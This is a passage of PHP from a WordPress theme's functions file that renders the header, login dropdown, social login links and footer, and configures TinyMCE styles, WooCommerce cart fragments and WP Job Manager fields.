                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_empty_space_component"></div>';
                                                    break;
                                                case 'empty_space4':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_empty_space_component"></div>';
                                                    break;
                                                case 'empty_space5':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_empty_space_component"></div>';
                                                    break;

                                            }
                                    }
                                }
                                $side_content_out = ob_get_clean();
                                if (!empty($side_content_out)) {
                                    $side_out .= "<div class='".$side_class." header_side'>";
                                        $side_out .=  "<div class='header_side_container'>";
                                            $side_out .= $side_content_out;
                                        $side_out .=  "</div>";//header side container end
                                    $side_out .=  "</div>";//header side end
                                }

                            if (!empty($side_out)) {
                                $header_sections[$level][$position] = $side_out;
                            }
                        }
                    }
                }
            }

            foreach ($header_sections as $header_section => $header_section_content) {
                //count($bottom_header_layout['Center align side']) <= 1 ? ' empty_center_side' : ''
                if (!empty($preset)) {
                    $header_mobile_class = !(bool)gt3_option_presets($preset,"side_".$header_section."_mobile") ? ' gt3_header_builder__section--hide_on_mobile' : '';
                }else{
                    $header_mobile_class = !(bool)gt3_option("side_".$header_section."_mobile") ? ' gt3_header_builder__section--hide_on_mobile' : '';
                }
                echo "<div class='gt3_header_builder__section gt3_header_builder__section--".esc_attr($header_section).(!empty($header_section_content['center']) ? ' not_empty_center_side' : '' ).$header_mobile_class."'>";
                    echo "<div class='gt3_header_builder__section-container".(!$header_full_width ? ' container' : ' container_full')."'>";
                        if (empty($header_section_content['left'])) {
                            echo "<div class='" . esc_attr($header_section) . "_left left header_side'></div>";
                        }
                        foreach ($header_section_content as $side => $side_content) {
                            echo  $side_content;
                        }
                        if (empty($header_section_content['right'])) {
                            echo "<div class='" . esc_attr($header_section) . "_right right header_side'></div>";
                        }
                    echo "</div>";
                echo "</div>";
            }
        echo "</div>";
        $gt3_header_builder__container = ob_get_clean();
        $output_array = array();
        $output_array['header_out'] = $gt3_header_builder__container;
        $output_array['is_login'] = $is_login;
        $output_array['is_burger_sidebar'] = $is_burger_sidebar;
        $output_array['is_header_menu'] = $is_header_menu;
        return $output_array;
    }
}

function gt3_dashboard_out(){
    if (is_user_logged_in()) {
        $menu_slug = gt3_option("login_select");
        if ( !class_exists( 'Gt3_wize_core' ) ) {
            $menu_slug = '';
        }
        echo "<div class='gt3_header_builder__login-dropdown'>";
            gt3_dashboard_menu($menu_slug);
        echo "</div>";
    }
}

function gt3_get_page_id_from_menu(){
    $page_ids = array();
    $menu_slug = gt3_option("login_select");
    $menu_obj = wp_get_nav_menu_object($menu_slug);

    if (!empty($menu_obj->term_id)) {
        $items = wp_get_nav_menu_items( $menu_obj->term_id );
    }else{
        $items = '';
    }
    if (!empty($items)) {
        foreach ($items as $item) {
            if (!empty($item->object_id)) {
                $page_ids[] = $item->object_id;
            }
        }
    }
    return $page_ids;
}

add_action( 'init', 'gt3_get_page_id_from_menu' );

function gt3_user_avatar_out($avatar_size=80,$show_email=false){
    $user_id = get_current_user_id();
    $current_user = get_user_by( 'id', $user_id );
    echo "<i class='gt3_login_icon gt3_login_icon--avatar'>";
        echo get_avatar($user_id,$avatar_size);
    echo "</i>";
    echo "<span class='gt3_login__user_name'>".esc_html( $current_user->display_name )."</span>";
    if ($show_email) {
        echo "<span class='gt3_login__user_email'>".esc_html( $current_user->user_email )."</span>";
    }
}

function gt3_social_login_out(){
    if (!is_user_logged_in()) {
        $is_nextend = in_array( 'nextend-facebook-connect/nextend-facebook-connect.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) );
        $i = 0;
        if ($is_nextend) {
            $i++;
        }
        if ($is_nextend && get_option('users_can_register')) {
            echo "<div class='gt3_header_builder__login-modal_footer'>";
                echo "<p class='gt3_modal_social_text'>".esc_html__( 'Connect with your social network', 'listingeasy' )."</p>";
                echo "<div class='gt3_social_login_item__wrapper'>";
                    if ($is_nextend) {
                        echo "<a href='" . wp_login_url() . "?loginSocial=facebook&redirect=" . get_permalink() . "' class='gt3_social_login_item gt3_facebook_login' title='".esc_html__( 'Login with Facebook', 'listingeasy' )."' data-plugin='nsl' data-action='connect' data-redirect='current' data-provider='facebook' data-popupwidth='475' data-popupheight='175'>";
                        echo '<i class="fa fa-facebook" aria-hidden="true"></i>';
                        //echo  $i < 3 ? '<span>'.esc_html__( 'Facebook', 'listingeasy' ).'</span>' : '';
                        echo "</a>";

                        echo "<a href='" . wp_login_url() . "?loginSocial=google&redirect=" . get_permalink() . "' class='gt3_social_login_item gt3_google_login' title='".esc_html__( 'Login with Google', 'listingeasy' )."' data-plugin='nsl' data-action='connect' data-redirect='current' data-provider='google' data-popupwidth='475' data-popupheight='175'>";
                        echo '<i class="fa fa-google" aria-hidden="true"></i>';
                        //echo  $i < 3 ?  '<span>'.esc_html__( 'Google', 'listingeasy' ).'</span>' : '';
                        echo "</a>";

                        echo "<a href='" . wp_login_url() . "?loginSocial=twitter&redirect=" . get_permalink() . "' class='gt3_social_login_item gt3_twitter_login' title='".esc_html__( 'Login with Twitter', 'listingeasy' )."' data-plugin='nsl' data-action='connect' data-redirect='current' data-provider='twitter' data-popupwidth='475' data-popupheight='175'>";
                        echo '<i class="fa fa-twitter" aria-hidden="true"></i>';
                        //echo  $i < 3 ?  '<span>'.esc_html__( 'Twitter', 'listingeasy' ).'</span>' : '';
                        echo "</a>";

                        echo "<a href='" . wp_login_url() . "?loginSocial=linkedin&redirect=" . get_permalink() . "' class='gt3_social_login_item gt3_linkedin_login' title='".esc_html__( 'Login with LinkedIn', 'listingeasy' )."' data-plugin='nsl' data-action='connect' data-redirect='current' data-provider='linkedin' data-popupwidth='475' data-popupheight='175'>";
                        echo '<i class="fa fa-linkedin" aria-hidden="true"></i>';
                        //echo  $i < 3 ?  '<span>'.esc_html__( 'LinkedIn', 'listingeasy' ).'</span>' : '';
                        echo "</a>";
                    }
                echo "</div>";
            echo "</div>";
        }
    }
}


if (!function_exists('gt3_option_presets')) {
    function gt3_option_presets($preset = '',$name = ''){
        return isset($preset[$name]) ? $preset[$name] : null;
    }
}

if (!function_exists('gt3_main_menu')) {
    function gt3_main_menu (){
        wp_nav_menu( array(
            'theme_location'  => 'main_menu',
            'container' => '',
            'container_class' => '',
            'after' => '',
            'link_before'     => '<span>',
            'link_after'      => '</span>',
            'walker' => ''
        ) );
    }
}

if (!function_exists('gt3_dashboard_menu')) {
    function gt3_dashboard_menu ($menu_slug){
        wp_nav_menu( array(
            'menu'            => $menu_slug,
            'container' => '',
            'container_class' => '',
            'after' => '',
            'link_before'     => '<span>',
            'link_after'      => '</span>',
            'walker' => new GT3_Walker_Dashboard_Menu (),
        ) );
    }
}

if (!function_exists('gt3_header_builder_menu')) {
    function gt3_header_builder_menu ($menu_slug){
        wp_nav_menu( array(
            'menu'            => $menu_slug,
            'container'       => '',
            'container_class' => '',
            'after'           => '',
            'link_before'     => '<span>',
            'link_after'      => '</span>',
            'walker' => new GT3_Walker_Nav_Menu (),
        ) );
    }
}

// need for vertical view of header in theme options (admin)
if (!function_exists('gt3_add_admin_class_menu_order')) {
    add_filter('admin_body_class', 'gt3_add_admin_class_menu_order');
    function gt3_add_admin_class_menu_order($classes) {
        if (gt3_option('bottom_header_vertical_order')) {
            $classes .= ' bottom_header_vertical_order';
        }
        return $classes;
    }
}


if (!function_exists('gt3_footer_area')) {
    function gt3_footer_area(){
        // footer option
        $footer_switch = gt3_option('footer_switch');
        $footer_spacing = gt3_option('footer_spacing');
        $footer_column = gt3_option_compare('footer_column','mb_footer_switch','yes');
        $footer_column2 = gt3_option_compare('footer_column2','mb_footer_switch','yes');
        $footer_column3 = gt3_option_compare('footer_column3','mb_footer_switch','yes');
        $footer_align = gt3_option_compare('footer_align','mb_footer_switch','yes');
        $footer_full_width = gt3_option_compare('footer_full_width','mb_footer_switch','yes');
        $footer_bg_color = gt3_option_compare('footer_bg_color','mb_footer_switch','yes');

        // copyright option
        $copyright_switch = gt3_option('copyright_switch');		
        $copyright_column = gt3_option('copyright_column');
        $copyright_align_1 = gt3_option_compare('copyright_align','mb_copyright_switch','1','mb_footer_switch','yes');
        $copyright_align_2 = gt3_option_compare('copyright_align_2','mb_copyright_switch','1','mb_footer_switch','yes');
        $copyright_align_3 = gt3_option_compare('copyright_align_3','mb_copyright_switch','1','mb_footer_switch','yes');

        $copyright_spacing = gt3_option('copyright_spacing');

        $copyright_bg_color = gt3_option_compare('copyright_bg_color','mb_copyright_switch','1','mb_footer_switch','yes');
        $copyright_top_border = gt3_option("copyright_top_border");
        $copyright_top_border_color = gt3_option("copyright_top_border_color");

        // METABOX VAR
        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            $mb_footer_switch = rwmb_meta('mb_footer_switch');
            if ($mb_footer_switch == 'yes') {
                $footer_switch = true;
                $footer_spacing = array();
                $mb_padding_top = rwmb_meta('mb_padding_top');
                $mb_padding_bottom = rwmb_meta('mb_padding_bottom');
                $mb_padding_left = rwmb_meta('mb_padding_left');
                $mb_padding_right = rwmb_meta('mb_padding_right');
                $footer_spacing['padding-top'] = !empty($mb_padding_top) ? $mb_padding_top : '';
                $footer_spacing['padding-bottom'] = !empty($mb_padding_bottom) ? $mb_padding_bottom : '';
                $footer_spacing['padding-left'] = !empty($mb_padding_left) ? $mb_padding_left : '';
                $footer_spacing['padding-right'] = !empty($mb_padding_right) ? $mb_padding_right : '';
                $mb_footer_sidebar_1 = rwmb_meta('mb_footer_sidebar_1');
                $mb_footer_sidebar_2 = rwmb_meta('mb_footer_sidebar_2');
                $mb_footer_sidebar_3 = rwmb_meta('mb_footer_sidebar_3');
                $mb_footer_sidebar_4 = rwmb_meta('mb_footer_sidebar_4');
            }elseif (rwmb_meta('mb_footer_switch') == 'no') {
                $footer_switch = false;
            }

            if ($mb_footer_switch == 'yes') {
                $mb_copyright_switch = rwmb_meta('mb_copyright_switch');
                if ($mb_copyright_switch == '1') {
                    $copyright_switch = true;

                    $mb_copyright_sidebar_1 = rwmb_meta('mb_copyright_sidebar_1');
                    $mb_copyright_sidebar_2 = rwmb_meta('mb_copyright_sidebar_2');
                    $mb_copyright_sidebar_3 = rwmb_meta('mb_copyright_sidebar_3');


                    $mb_copyright_padding_top = rwmb_meta('mb_copyright_padding_top');
                    $mb_copyright_padding_bottom = rwmb_meta('mb_copyright_padding_bottom');
                    $mb_copyright_padding_left = rwmb_meta('mb_copyright_padding_left');
                    $mb_copyright_padding_right = rwmb_meta('mb_copyright_padding_right');
                    $copyright_spacing['padding-top'] = !empty($mb_copyright_padding_top) ? $mb_copyright_padding_top : '';
                    $copyright_spacing['padding-bottom'] = !empty($mb_copyright_padding_bottom) ? $mb_copyright_padding_bottom : '';
                    $copyright_spacing['padding-left'] = !empty($mb_copyright_padding_left) ? $mb_copyright_padding_left : '';
                    $copyright_spacing['padding-right'] = !empty($mb_copyright_padding_right) ? $mb_copyright_padding_right : '';

                    $copyright_top_border = rwmb_meta("mb_copyright_top_border");
                    $mb_copyright_top_border_color = rwmb_meta("mb_copyright_top_border_color");
                    $mb_copyright_top_border_color_opacity = rwmb_meta("mb_copyright_top_border_color_opacity");

                    if (!empty($mb_copyright_top_border_color) && $copyright_top_border == '1') {
                        $copyright_top_border_color['rgba'] = 'rgba('.(gt3_HexToRGB($mb_copyright_top_border_color)).','.$mb_copyright_top_border_color_opacity.')';
                    }else{
                        $copyright_top_border_color = '';
                    }

                }else{
                    $copyright_switch = false;
                    $mb_copyright_switch = false;
                }


            }elseif (rwmb_meta('mb_footer_switch') == 'no') {
                $copyright_switch = false;
                $mb_copyright_switch = false;
            }else{
                $mb_copyright_switch = false;
            }

        }else{
            $mb_footer_switch = false;
            $mb_copyright_switch = false;
        }
		
        //footer container style
        $footer_cont_style = !empty($footer_bg_color) ? ' background-color :'.esc_attr($footer_bg_color).';' : '';
        $footer_cont_style .= gt3_background_render('footer','mb_footer_switch','yes');

        $footer_cont_style = !empty($footer_cont_style) ? ' style="'.$footer_cont_style.'"' : '' ;

        //footer container class
        $footer_class = '';
        $footer_class .= ' align-'.esc_attr($footer_align);

        //footer padding
        $footer_top_padding = !empty($footer_spacing['padding-top']) ? $footer_spacing['padding-top'] : '';
        $footer_bottom_padding = !empty($footer_spacing['padding-bottom']) ? $footer_spacing['padding-bottom'] : '';
        $footer_left_padding = !empty($footer_spacing['padding-left']) ? $footer_spacing['padding-left'] : '';
        $footer_right_padding = !empty($footer_spacing['padding-right']) ? $footer_spacing['padding-right'] : '';

        //footer style
        $footer_style = '';
        $footer_style .= !empty($footer_top_padding) ? 'padding-top:'.esc_attr((int)$footer_top_padding).'px;' : '' ;
        $footer_style .= !empty($footer_bottom_padding) ? 'padding-bottom:'.esc_attr((int)$footer_bottom_padding).'px;' : '' ;
        $footer_style .= !empty($footer_left_padding) ? 'padding-left:'.esc_attr((int)$footer_left_padding).'px;' : '' ;
        $footer_style .= !empty($footer_right_padding) ? 'padding-right:'.esc_attr((int)$footer_right_padding).'px;' : '' ;
        $footer_style = !empty($footer_style) ? ' style="'.$footer_style.'"' : '';

        /*
        *
        * copyright code
        */
        // copyright class
        $copyright_class = '';

        // copyright container style
        $copyright_cont_style = '';
        $copyright_cont_style .= !empty($copyright_bg_color) ? 'background-color:'.esc_attr($copyright_bg_color).';' : '';
        
        if ($copyright_top_border == '1') {            
            $copyright_cont_style .= !empty($copyright_top_border_color['rgba']) ? 'border-top: 1px solid '.esc_attr($copyright_top_border_color['rgba']).';' : '';  
            if ($footer_full_width) {
                $copyright_cont_style .= !empty($copyright_top_border_color['rgba']) ? 'border-top: 1px solid '.esc_attr($copyright_top_border_color['rgba']).';' : '';  
            }
        }else{
            $copyright_cont_border_style = '';
        }
        $copyright_cont_style = !empty($copyright_cont_style) ? ' style="'.$copyright_cont_style.'"' : '';

        // copyright padding
        $copyright_top_padding = !empty($copyright_spacing['padding-top']) ? $copyright_spacing['padding-top'] : '';
        $copyright_bottom_padding = !empty($copyright_spacing['padding-bottom']) ? $copyright_spacing['padding-bottom'] : '';
        $copyright_left_padding = !empty($copyright_spacing['padding-left']) ? $copyright_spacing['padding-left'] : '';
        $copyright_right_padding = !empty($copyright_spacing['padding-right']) ? $copyright_spacing['padding-right'] : '';
        // copyright style
        $copyright_style = '';
        $copyright_style .= !empty($copyright_top_padding) ? 'padding-top:'.esc_attr((int)$copyright_top_padding).'px;' : '' ;
        $copyright_style .= !empty($copyright_bottom_padding) ? 'padding-bottom:'.esc_attr((int)$copyright_bottom_padding).'px;' : '' ;
        $copyright_style .= !empty($copyright_left_padding) ? 'padding-left:'.esc_attr((int)$copyright_left_padding).'px;' : '' ;
        $copyright_style .= !empty($copyright_right_padding) ? 'padding-right:'.esc_attr((int)$copyright_right_padding).'px;' : '' ;
        $copyright_style = !empty($copyright_style) ? ' style="'.$copyright_style.'"' : '';        

        /*
        *
        * column build
        */
        $column_sizes = array();
        switch ((int)$footer_column) {
            case 1:
                $column_sizes = array('12');
                break;
            case 2:
                $column_sizes = explode("-", $footer_column2);
                break;
            case 3:
                $column_sizes = explode("-", $footer_column3);
                break;
            case 4:
                $column_sizes = array('3','3','3','3');
                break;
            default:
                $column_sizes = array('3','3','3','3');
                break;
        }

        /*
        *
        * footer out
        */
        if ($footer_switch || $copyright_switch) {
            echo "<footer class='main_footer fadeOnLoad clearfix'".$footer_cont_style." id='footer'>";

                if ($footer_switch) {
                    echo "<div class='top_footer column_".(int)$footer_column.$footer_class."'>";
                        echo  (bool)$footer_full_width ? "" : "<div class='container'>";
                        echo "<div class='row'".$footer_style.">";
                            for ($i=0; $i < (int)$footer_column; $i++) { 
                                echo "<div class='span".(!empty($column_sizes[$i]) ? (int)$column_sizes[$i] : '3')."'>";
                                    if ($mb_footer_switch == 'yes') {
                                        if (is_active_sidebar( ${'mb_footer_sidebar_'.($i+1)} )) {
                                            dynamic_sidebar( ${'mb_footer_sidebar_'.($i+1)} );
                                        }
                                    }else{
                                        if (is_active_sidebar( 'footer_column_' . ($i+1) )) {
                                            dynamic_sidebar( 'footer_column_' . ($i+1) );
                                        }
                                    }
                                    
                                echo "</div>";
                            }
                        echo "</div>";
                        echo  $footer_full_width ? "" : "</div>";
                    echo "</div>";
                }
				
                if ($copyright_switch) {
                    echo "<div class='copyright".$copyright_class."'".$copyright_cont_style.">";
                        echo (bool)$footer_full_width ? "" : "<div class='container'>";
                           echo "<div class='row'".$copyright_style.">";
                               for ($i=0; $i < (int)$copyright_column; $i++) { 
                                    echo "<div class='span".(12/(int)$copyright_column).(' align-'.esc_attr(${'copyright_align_'.($i+1)}))."'>";
                                        if ($mb_copyright_switch == 'yes') {
                                            if (is_active_sidebar( ${'mb_copyright_sidebar_'.($i+1)} )) {
                                                dynamic_sidebar( ${'mb_copyright_sidebar_'.($i+1)} );
                                            }
                                        }else{
                                            if (is_active_sidebar( 'copyright_column_' . ($i+1) )) {
                                                dynamic_sidebar( 'copyright_column_' . ($i+1) );
                                            }
                                        }
                                        
                                    echo "</div>";
                                }
                           echo "</div>";
                        echo  $footer_full_width ? "" : "</div>";
                    echo "</div>";
                }
				
				
            echo "</footer>";
        }
    }
}

if (!function_exists('gt3_option_compare')) {
    function gt3_option_compare($opt_name,$meta_conditional = false,$meta_value = false,$meta_conditional2 = false,$meta_value2 = false){
        $option = gt3_option($opt_name);
        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            if ($meta_conditional != false) {           
                if ($meta_conditional2 != false) {
                    if (rwmb_meta($meta_conditional) == $meta_value &&rwmb_meta($meta_conditional2) == $meta_value2) {
                        $option = rwmb_meta('mb_'.$opt_name);
                    }
                }else{
                    if (rwmb_meta($meta_conditional) == $meta_value ) {
                        $option = rwmb_meta('mb_'.$opt_name);
                    }
                }
            }else{
                $option = rwmb_meta('mb_'.$opt_name);
            }
        }
        return $option;
    }
}

// need for comparing (theme_options or metabox) and out html with background settings
if (!function_exists('gt3_background_render')) {
    function gt3_background_render($opt_name,$meta_conditional = false,$meta_value = false){
        $image_array = gt3_option($opt_name."_bg_image");
        $bg_src = !empty($image_array['background-image']) ? $image_array['background-image'] : '';
        $bg_repeat = !empty($image_array['background-repeat']) ? $image_array['background-repeat'] : '';
        $bg_size = !empty($image_array['background-size']) ? $image_array['background-size'] : '';
        $attachment = !empty($image_array['background-attachment']) ? $image_array['background-attachment'] : '';
        $position = !empty($image_array['background-position']) ? $image_array['background-position'] : '';

        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            if ($meta_conditional != false) {
                $mb_conditional = rwmb_meta($meta_conditional);
                if ($mb_conditional == $meta_value) {
                    $bg_src = rwmb_meta('mb_'.$opt_name.'_bg_image');
                    $bg_src = !empty($bg_src) ? $bg_src : '';
                    if (!empty($bg_src)) {
                        $bg_src = array_values($bg_src);
                        $bg_src = $bg_src[0]['url'];
                    }
                    if (!empty($bg_src)) {
                        $bg_repeat = rwmb_meta('mb_'.$opt_name.'_bg_repeat');
                        $bg_repeat = !empty($bg_repeat) ? $bg_repeat : '';
                        $bg_size = rwmb_meta('mb_'.$opt_name.'_bg_size');
                        $bg_size = !empty($bg_size) ? $bg_size : '';
                        $attachment = rwmb_meta('mb_'.$opt_name.'_bg_attachment');
                        $attachment = !empty($attachment) ? $attachment : '';
                        $position = rwmb_meta('mb_'.$opt_name.'_bg_position');
                        $position = !empty($position) ? $position : '';
                    }else{
                        $bg_repeat = '';
                        $bg_size = '';
                        $attachment = '';
                        $position = '';
                    }              
                }
            }
        }
        $bg_styles = '';
        $bg_styles .= !empty($bg_src) ? 'background-image:url('.esc_url($bg_src).');' : '';
        if (!empty($bg_src)) {
           $bg_styles .= !empty($bg_size) ? 'background-size:'.esc_attr($bg_size).';' : '';
            $bg_styles .= !empty($bg_repeat) ? 'background-repeat:'.esc_attr($bg_repeat).';' : '';
            $bg_styles .= !empty($attachment) ? 'background-attachment:'.esc_attr($attachment).';' : '';
            $bg_styles .= !empty($position) ? 'background-position:'.esc_attr($position).';' : '';
        }
        
        return $bg_styles;
    }
}

// return all sidebars
if (!function_exists('gt3_get_all_sidebar')) {
    function gt3_get_all_sidebar() {
        global $wp_registered_sidebars;
        $out = array('' => '' );
        if ( empty( $wp_registered_sidebars ) )
            return;
         foreach ( $wp_registered_sidebars as $sidebar_id => $sidebar) :
            $out[$sidebar_id] = $sidebar['name'];
         endforeach; 
         return $out;
    }
}


function gt3_get_attachment( $attachment_id ) {
	$attachment = get_post( $attachment_id );
	return array(
		'alt' => get_post_meta( $attachment->ID, '_wp_attachment_image_alt', true ),
		'caption' => $attachment->post_excerpt,
		'description' => $attachment->post_content,
		'href' => get_permalink( $attachment->ID ),
		'src' => $attachment->guid,
		'title' => $attachment->post_title
	);
}

// GT3 Featured Post CSS
add_action('wp_enqueue_scripts', 'gt3_blog_custom_styles_js');
function gt3_blog_custom_styles_js($custom_blog_css) {
    echo '
        <script type="text/javascript">
            var custom_blog_css = "' . $custom_blog_css . '";
            if (document.getElementById("custom_blog_styles")) {
                document.getElementById("custom_blog_styles").innerHTML += custom_blog_css;
            } else if (custom_blog_css !== "") {
                document.head.innerHTML += \'<style id="custom_blog_styles" type="text/css">\'+custom_blog_css+\'</style>\';
            }
        </script>
    ';
}

if (!function_exists('gt3_showJSInFooter')) {
    function gt3_showJSInFooter()
    {
        if (isset($GLOBALS['showOnlyOneTimeJS']) && is_array($GLOBALS['showOnlyOneTimeJS'])) {
            foreach ($GLOBALS['showOnlyOneTimeJS'] as $id => $js) {
                echo  $js;
            }
        }
    }
}
add_action('wp_footer', 'gt3_showJSInFooter');

function gt3_tiny_mce_before_init( $settings ) {

    $settings['theme_advanced_blockformats'] = 'p,h1,h2,h3,h4';
    $style_formats = array(
        array( 'title' => esc_html__( 'Font Weight', 'listingeasy' ), 'items' => array(
            array( 'title' => esc_html__( 'Default', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => 'inherit' ) ),
            array( 'title' => esc_html__( 'Lightest (100)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '100' ) ),
            array( 'title' => esc_html__( 'Lighter (200)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '200' ) ),
            array( 'title' => esc_html__( 'Light (300)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '300' ) ),
            array( 'title' => esc_html__( 'Normal (400)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '400' ) ),
            array( 'title' => esc_html__( 'Medium (500)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '500' ) ),
            array( 'title' => esc_html__( 'Semi-Bold (600)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '600' ) ),
            array( 'title' => esc_html__( 'Bold (700)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '700' ) ),
            array( 'title' => esc_html__( 'Bolder (800)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '800' ) ),
            array( 'title' => esc_html__( 'Extra Bold (900)', 'listingeasy' ), 'inline' => 'span', 'classes' => 'gt3_font-weight', 'styles' => array( 'font-weight' => '900' ) ),
        )
        ),
        array( 'title' => esc_html__( 'List Style', 'listingeasy' ), 'items' => array(
            array( 'title' => esc_html__( 'Check', 'listingeasy' ), 'selector' => 'ul', 'classes' => 'gt3_list_check'),
            array( 'title' => esc_html__( 'Check in circle', 'listingeasy' ), 'selector' => 'ul', 'classes' => 'gt3_list_check_circle'),
            array( 'title' => esc_html__( 'Check in square', 'listingeasy' ), 'selector' => 'ul', 'classes' => 'gt3_list_check_square'),
            array( 'title' => esc_html__( 'Angle right', 'listingeasy' ), 'selector' => 'ul', 'classes' => 'gt3_list_angle_right'),
            array( 'title' => esc_html__( 'Plus', 'listingeasy' ), 'selector' => 'ul', 'classes' => 'gt3_list_plus'),
            array( 'title' => esc_html__( 'Times', 'listingeasy' ), 'selector' => 'ul', 'classes' => 'gt3_list_times'),
        )
        ),
    );

    $settings['style_formats'] = str_replace( '"', "'", json_encode( $style_formats ) );
    $settings['extended_valid_elements'] = 'span[*],a[*],i[*]';
    return $settings;
}

add_filter( 'tiny_mce_before_init', 'gt3_tiny_mce_before_init' );

function gt3_wpdocs_theme_add_editor_styles() {
    add_editor_style( 'css/font-awesome.min.css' );
    add_editor_style( 'css/tiny_mce.css' );
}
add_action( 'current_screen', 'gt3_wpdocs_theme_add_editor_styles' );

if (in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) )) {
    require_once( get_template_directory() . '/woocommerce/wooinit.php' ); // Wocommerce ini file
}


if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
    add_filter( 'woocommerce_add_to_cart_fragments', 'gt3_woocommerce_header_add_to_cart_fragment' );
}

function gt3_woocommerce_header_add_to_cart_fragment( $fragments ) {
  global $woocommerce;
  ob_start();
    ?>
      <i class='woo_mini-count'><?php echo ((WC()->cart->cart_contents_count > 0) ?  '<span>' . esc_html( WC()->cart->cart_contents_count ) .'</span>' : '') ?></i>
    <?php
    $fragments['.woo_mini-count'] = ob_get_clean();

    ob_start();
    echo '<div class="gt3_header_builder_cart_component__cart-container">';
    woocommerce_mini_cart();
    echo '</div>';
    $fragments['.gt3_header_builder_cart_component__cart-container'] = ob_get_clean();

    return $fragments;
}

function gt3_categories_postcount_filter ($variable) {
    preg_match('/(class="count")/', $variable, $matches);
    if (empty($matches)) {
        $variable = str_replace('</a> (', '</a> <span class="post_count">', $variable); 
        $variable = str_replace('</a>&nbsp;(', '</a>&nbsp;<span class="post_count">', $variable);
        $variable = str_replace(')', '</span>', $variable);
    }
    return $variable; 
} 
add_filter('get_archives_link','gt3_categories_postcount_filter'); 
add_filter('wp_list_categories','gt3_categories_postcount_filter');

// First Update Options for Job Manager
if ( ! function_exists( 'gt3_config_getting_active' ) ) :
    function gt3_config_getting_active() {
        /**
         * ACTIVATION SETTINGS
         * These settings will be needed when the theme will get active
         * Careful with the first setup, most of them will go in the clients database and they will be stored there
         */

        // force  settings for category icon settings
        $category_icons = get_option( 'category-icon' );
        if ( ! isset( $category_icons['settings_saved_once'] ) || $category_icons['settings_saved_once'] !== '1' ) {
            $category_icons['taxonomies']          = array(
                'category'             => 'on',
                'post_tag'             => 'on',
                'job_listing_category' => 'on',
                'job_listing_region'   => 'on',
                'job_listing_tag'      => 'on'
            );
            $category_icons['settings_saved_once'] = '1';
            update_option( 'category-icon', $category_icons );

            // also at the first activation adjust a few settings for wp-job manager
            update_option( 'job_manager_enable_categories', '1' );
            update_option( 'job_manager_enable_tag_archive', '1' );
            update_option( 'job_manager_tag_input', 'multiselect' );
            update_option( 'job_manager_paid_listings_flow', 'before' );
        }
    }
endif; // end gt3_config_getting_active

add_action( 'after_switch_theme', 'gt3_config_getting_active' );

add_theme_support( 'job-manager-templates' );

function gt3_my_custom_admin_head()
{
    echo '<script type="text/javascript">var gt3_admin_themeurl = "' . esc_url(get_template_directory_uri()) . '";</script>';
}
add_action('admin_head', 'gt3_my_custom_admin_head');

add_editor_style( 'core/admin/css/gt3_wize_buttons.css' );
function gt3_wize_buttons() {
	if (current_user_can('edit_posts') && current_user_can('edit_pages')) {
		add_filter('mce_external_plugins', 'gt3_wize_buttons_plugin');
		add_filter('mce_buttons', 'gt3_wize_buttons_register_button');
	}
}

add_action('init', 'gt3_wize_buttons');
function gt3_wize_buttons_plugin($plugin_array){
	$plugin_array['gt3_wize_buttons'] = esc_url(get_template_directory_uri()).'/core/admin/js/gt3_wize_buttons.js';
	return $plugin_array;
}

add_filter( 'mce_external_plugins', 'gt3_definition_list_register_tinymce_javascript' );
function gt3_definition_list_register_tinymce_javascript( $plugin_array ) {
    $plugin_array['gt3_definition_list'] = esc_url(get_template_directory_uri()).'/core/integrations/js/gt3_definition_list.js';
    return $plugin_array;
}

function gt3_wize_buttons_register_button($buttons){
    array_unshift( $buttons, 'styleselect' );
    array_push( $buttons, 'backcolor' );
    array_push( $buttons, 'forecolor' );
    array_push($buttons, "gt3_blockquote");
	array_push($buttons, "gt3_dropcap");
    array_push($buttons, "gt3_definition_list");
	return $buttons;
}

function gt3_show_social_icons($array)
{
    $compile = "";
    foreach ($array as $key => $value) {
        if (strlen(gt3_option($value['uniqid'])) > 0) {
            $compile .= "<li><a class='" . $value['class'] . "' target='" . $value['target'] . "' href='" . gt3_option($value['uniqid']) . "' title='" . $value['title'] . "'><i class='fa fa-" . $value['class'] . "'></i></a></li>";
        }
    }
    $compile .= "";
    if (is_array($array) && count($array) > 0) {
        return $compile;
    } else {
        return "";
    }
}

/* Add WP Job Manager Fields */
function gt3_add_fields( $fields ) {

	// reorder fields
	$fields['_company_tagline']['priority'] = 2.1;
	$fields['_job_location']['priority']    = 2.2;
	$fields['_company_website']['priority'] = 2.7;
	$fields['_company_twitter']['priority'] = 2.8;

	$fields['_job_hours'] = array(
		'label'       => esc_html__( 'Hours', 'listingeasy' ),
		'type'        => 'textarea',
		'placeholder' => esc_html__( "Mon - Fri: 09:00 - 23:00 \nSat - Sun: 17:00 - 23:00", 'listingeasy' ),
		'priority'    => 2.3
	);

	$fields['_company_phone'] = array(
		'label'       => esc_html__( 'Phone', 'listingeasy' ),
		'placeholder' => esc_html__( 'e.g +42-898-4364', 'listingeasy' ),
		'priority'    => 2.4
	);
	$fields['_company_email'] = array(
		'label'       => esc_html__( 'Email', 'listingeasy' ),
